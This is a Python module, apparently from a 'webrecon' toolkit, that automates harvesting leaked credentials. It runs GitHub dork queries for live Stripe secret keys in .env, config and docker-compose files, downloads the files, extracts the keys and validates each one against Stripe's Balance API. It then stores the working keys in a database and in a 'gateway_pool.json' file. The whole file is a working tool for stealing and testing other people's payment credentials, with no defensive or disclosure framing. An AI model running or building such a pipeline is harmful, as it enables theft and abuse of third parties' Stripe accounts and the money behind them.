"""GitHub dorker integration -- refactored from ``github_dorker.py``.

This module replicates the functionality of the original
``github_dorker.py`` using the ``webrecon`` package:

1. Dork GitHub for ``sk_live_`` keys in various file types.
2. Download raw file content and extract keys.
3. Validate ``sk_live_`` keys via Stripe Balance API.
4. Save results to the database (replaces ``gateway_pool.json``).

Original script interface preserved for backward compatibility.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

from webrecon.core.models import KeyType, StripeKey
from webrecon.github.analyzer import SecretMatch, stripe_key_to_model
from webrecon.log import get_logger

__all__ = ["run_github_dorker"]

_LOGGER = get_logger(__name__)

# Default dork queries matching the original script.
_DEFAULT_DORKS: list[str] = [
    "sk_live_ filename:.env",
    "sk_live_ filename:.env.local",
    "sk_live_ filename:wp-config.php",
    "sk_live_ filename:config.php",
    "sk_live_ filename:config.json",
    "sk_live_ filename:settings.py",
    "sk_live_ filename:application.yml",
    "sk_live_ filename:application.properties",
    "sk_live_ filename:docker-compose.yml",
    "sk_live_ filename:.env.production",
]


async def run_github_dorker(
    *,
    github_token: str = "",
    dorks: list[str] | None = None,
    max_pages: int = 5,
    validate_keys: bool = True,
    save_to_db: bool = True,
    db_path: str = "webrecon.sqlite3",
    gateway_pool_path: str = "gateway_pool.json",
    concurrency: int = 5,
) -> list[StripeKey]:
    """Run the GitHub dorker pipeline.

    This is the refactored equivalent of ``github_dorker.py``'s
    ``main()`` function.

    Args:
        github_token: GitHub personal access token.
        dorks: List of GitHub search queries. Defaults to
            :data:`_DEFAULT_DORKS`.
        max_pages: Maximum pages per dork query.
        validate_keys: Whether to validate found keys via Stripe API.
        save_to_db: Whether to persist results to the database.
        db_path: Path to the SQLite database file.
        gateway_pool_path: Path to ``gateway_pool.json``.
        concurrency: Download concurrency limit.

    Returns:
        List of :class:`StripeKey` instances found.
    """
    import httpx

    from webrecon.automation.stripe_tester import StripeTester
    from webrecon.github import GithubClient
    from webrecon.github.analyzer import GithubAnalyzer
    from webrecon.mass_parser.client import MassParserClient

    if not github_token:
        _LOGGER.error("github_integration.missing_token")
        return []

    queries = dorks or _DEFAULT_DORKS
    all_secrets: list[SecretMatch] = []
    stripe_keys: list[StripeKey] = []

    async with httpx.AsyncClient() as http:
        client = GithubClient(http, token=github_token)
        analyzer = GithubAnalyzer(client, max_concurrent_downloads=concurrency)

        # Step 1: Search and analyze each dork.
        for query in queries:
            _LOGGER.info("github_integration.dork_start", query=query)
            async for secret in analyzer.analyze_query(query, max_pages=max_pages):
                all_secrets.append(secret)
                _LOGGER.info(
                    "github_integration.secret_found",
                    pattern=secret.pattern_name,
                    repo=secret.repository_name,
                    severity=secret.severity,
                )

    _LOGGER.info(
        "github_integration.search_complete",
        total_secrets=len(all_secrets),
    )

    # Step 2: Convert Stripe key secrets to models.
    sk_secrets = [s for s in all_secrets if s.key_type in (KeyType.SK_LIVE, KeyType.PK_LIVE)]
    for secret in sk_secrets:
        key = stripe_key_to_model(secret)
        stripe_keys.append(key)

    # Step 3: Validate keys via Stripe API.
    if validate_keys and stripe_keys:
        async with MassParserClient(concurrency=3) as stripe_http:
            tester = StripeTester(stripe_http)
            for i, key in enumerate(stripe_keys):
                if key.key_type == KeyType.SK_LIVE:
                    result = await tester.validate_sk(key.key_value, stripe_key_model=key)
                    if result.stripe_key:
                        stripe_keys[i] = result.stripe_key
                    _LOGGER.info(
                        "github_integration.key_validated",
                        key_prefix=key.key_value[:8],
                        is_valid=result.is_valid,
                    )

    # Step 4: Save to database.
    if save_to_db and stripe_keys:
        from webrecon.database import StripeKeyRepository, open_database
        pool = await open_database(db_path)
        repo = StripeKeyRepository(pool)
        for key in stripe_keys:
            try:
                await repo.upsert(key)
            except Exception as exc:
                _LOGGER.warning("github_integration.db_error", error=str(exc))
        await pool.close()

    # Step 5: Write gateway_pool.json for backward compatibility.
    if gateway_pool_path:
        _write_gateway_pool(stripe_keys, gateway_pool_path)

    _LOGGER.info(
        "github_integration.complete",
        secrets_found=len(all_secrets),
        stripe_keys=len(stripe_keys),
    )

    return stripe_keys


def _write_gateway_pool(keys: list[StripeKey], path: str) -> None:
    """Write a ``gateway_pool.json`` file for backward compatibility."""
    entries: list[dict[str, Any]] = []
    for key in keys:
        entry: dict[str, Any] = {
            "key_type": key.key_type.value,
            "key_value": key.key_value[:12] + "...",
            "is_valid": key.is_valid,
            "source_url": key.source_url or "",
            "source_file": key.source_file or "",
            "discovered_at": key.discovered_at.isoformat() if key.discovered_at else "",
        }
        entries.append(entry)

    pool_path = Path(path)
    existing: list[dict[str, Any]] = []
    if pool_path.exists():
        try:
            existing = json.loads(pool_path.read_text(encoding="utf-8"))
        except Exception:
            existing = []

    existing.extend(entries)
    pool_path.write_text(
        json.dumps(existing, indent=2, ensure_ascii=False),
        encoding="utf-8",
    )
